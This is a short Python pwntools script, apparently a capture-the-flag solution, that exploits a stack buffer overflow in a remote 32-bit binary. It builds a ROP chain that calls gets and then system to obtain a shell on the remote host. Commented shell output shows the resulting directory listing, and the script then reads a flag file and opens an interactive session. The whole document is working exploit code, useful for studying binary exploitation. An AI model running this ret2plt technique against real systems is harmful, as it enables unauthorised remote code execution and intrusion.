from pwn import *
import struct

BUFF = 60

server = ELF("server")

gets_plt = struct.pack("<I", (server.plt[b'gets']))
system_plt = struct.pack("<I", (server.plt[b'system']))
pop_ebx = struct.pack("<I", (0x080483c9))
bss = 0x804a0a1

r = remote("thekidofarcrania.com", 4902)

payload = flat(["A" * BUFF, gets_plt, pop_ebx, bss, system_plt, 0xdeadbeef, bss])

r.recvuntil("Legend")
r.send(payload + b"\n")
r.recv()

# dir
# $ dir
# bin   dev  flag.txt   home  lib64  mnt    proc  run   server  sys  usr
# boot  etc  flag2.txt  lib   media  opt    root  sbin  srv     tmp  var

r.sendline("cat flag2.txt")
r.interactive()